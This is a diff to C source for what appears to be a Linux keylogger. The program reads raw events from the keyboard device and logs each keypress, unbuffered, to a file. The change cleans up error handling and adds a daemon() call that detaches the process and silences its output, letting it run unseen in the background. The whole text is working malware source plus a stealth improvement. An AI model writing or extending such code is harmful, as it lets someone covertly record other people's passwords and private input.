@@ -1,9 +1,11 @@
 #include <stdio.h>
-#include <fcntl.h>  // open
+#include <fcntl.h>   // open
 #include <stdlib.h>
-#include <string.h> // strerror
+#include <string.h>  // strerror
+#include <errno.h>
 #include <stdint.h>
 #include <assert.h>
+#include <unistd.h>  // daemon, close
 #include <linux/input.h>
 
 #include "key_util.h"
@@ -41,9 +43,9 @@ static char *getKeyboardDeviceFileName() {
  */
 static int openKeyboardDeviceFile() {
    int kbd_fd = open(getKeyboardDeviceFileName(), O_RDONLY);
-   if (kbd_fd < 0) {
-      printf("%s\n", strerror(kbd_fd));
-      exit(kbd_fd);
+   if (kbd_fd == -1) {
+      LOG_ERROR("%s", strerror(errno));
+      exit(-1);
    }
 
    return kbd_fd;
@@ -63,6 +65,13 @@ int main() {
 
    // We want to write to the file on every keypress, so disable buffering
    setbuf(logfile, NULL);
+
+   // Daemonize process. Don't change working directory but redirect standard
+   // inputs and outputs to /dev/null
+   if (daemon(1, 0) == -1) {
+      LOG_ERROR("%s", strerror(errno));
+      exit(-1);
+   }
 
    input_event event;
    while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
